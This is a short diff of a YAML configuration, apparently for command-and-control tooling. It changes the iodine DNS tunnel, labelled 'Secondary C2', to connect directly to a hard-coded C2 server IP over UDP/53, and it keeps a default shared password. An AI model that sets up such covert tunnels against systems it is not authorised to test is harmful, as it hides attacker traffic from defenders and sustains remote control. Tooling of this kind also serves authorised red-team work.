@@ -60,9 +60,11 @@ chisel:
 # ── DNS Tunnel (iodine) — Secondary C2 ─────────────────────────
 dns_tunnel:
   enabled: true
-  # Tunnel domain — NS record for this domain must point to c2.host
-  # e.g.  t.example.com  IN  NS  66.194.172.172.
+  # Tunnel domain — used by iodine as the tunnel identifier
   domain: t.example.com
+  # Direct mode — connect to C2 server on UDP/53 instead of relying
+  # on recursive DNS resolution (no NS delegation required)
+  nameserver: 66.194.172.172
   # Shared secret between iodine client and iodined server
   password: changeme
   # Tunnel network (iodined server-side subnet for the dns0 interface)
